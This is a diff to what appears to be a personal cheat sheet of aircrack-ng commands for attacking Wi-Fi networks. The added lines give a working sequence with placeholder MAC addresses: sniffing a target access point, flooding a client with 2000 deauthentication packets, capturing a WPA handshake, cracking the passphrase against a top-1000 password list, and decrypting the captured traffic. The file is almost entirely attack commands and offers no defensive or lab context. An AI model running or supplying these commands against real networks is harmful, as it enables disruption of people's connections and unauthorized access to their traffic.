@@ -24,20 +24,85 @@ airmon-ng start wlan1
 
 
 
+---------- Disable Monitor Mode ----------
+
+# take card out of monitor mode
+airmon-ng stop wlan0mon
+
+# restart network manager
+service network-manager start
+
+
+
 ---------- Find and Sniff Network ----------
 
 # find the network that we want
 airodump-ng wlan1mon
 
 # sniff and save packets
-airodump-ng --bssid AB:7B:CD:5D:82:C2 --channel 1 --write Desktop/WPAcapture wlan1mon
+airodump-ng --bssid <AP MAC> --channel <#> --write Desktop/WPAcapture wlan1mon
 
 
 
 ---------- Deauth Attack ----------
 
-# find the network that we want
-airodump-ng wlan1mon
+# find the devices on a network
+airodump-ng --bssid <AP MAC> --channel <#> wlan1mon
 
-# sniff and save packets
-airodump-ng --bssid F0:7B:CB:5D:75:C2 --channel 1 --write Desktop/WPAcapture wlan1mon
+# send deauth packets
+aireplay-ng --deauth 2000 -a <AP MAC> -c <TARGET MAC> wlan1mon
+
+
+
+---------- Crack WPA / WPA2 Passphrase ----------
+
+# capture handshake
+airodump-ng --bssid <AP MAC> --channel <#> --write Desktop/Captures/WPAsample wlan1mon
+
+# loop through passwords
+aircrack-ng Desktop/Captures/WPAsample-01.cap -w Desktop/Lists/passwords_top_1000.txt
+
+# decrypt packets
+airdecap-ng -e 'HOMEWIFI' -p bacon123 Desktop/Captures/WPAsample-01.cap
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
